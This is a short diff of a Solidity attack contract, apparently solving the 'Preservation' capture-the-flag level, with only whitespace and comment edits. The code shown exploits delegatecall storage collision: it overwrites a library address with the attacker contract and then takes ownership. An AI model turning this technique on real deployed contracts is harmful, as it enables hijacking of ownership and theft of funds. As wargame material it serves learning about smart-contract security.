@@ -9,7 +9,7 @@ contract PreservationAttack {
     address public timeZone2Library;
     address public owner;
     Preservation preservation;
-    
+
     constructor(address _preservationAddress) {
         preservation = Preservation(_preservationAddress);
     }
@@ -17,7 +17,7 @@ contract PreservationAttack {
     function attack() public {
         // call setFirstTime with the attacker address, this execution will change the address timeZone1Library to the attacker address
         preservation.setFirstTime(uint256(uint160(address(this))));
-        // execute the setFirstTime function again, this time the transaction will execute setTime in our contract
+        // execute the setFirstTime function again, this time the transaction will execute setTime in our contract with players address
         preservation.setFirstTime(uint256(uint160(msg.sender)));
         require(preservation.owner() == msg.sender, "Attack failed");
     }
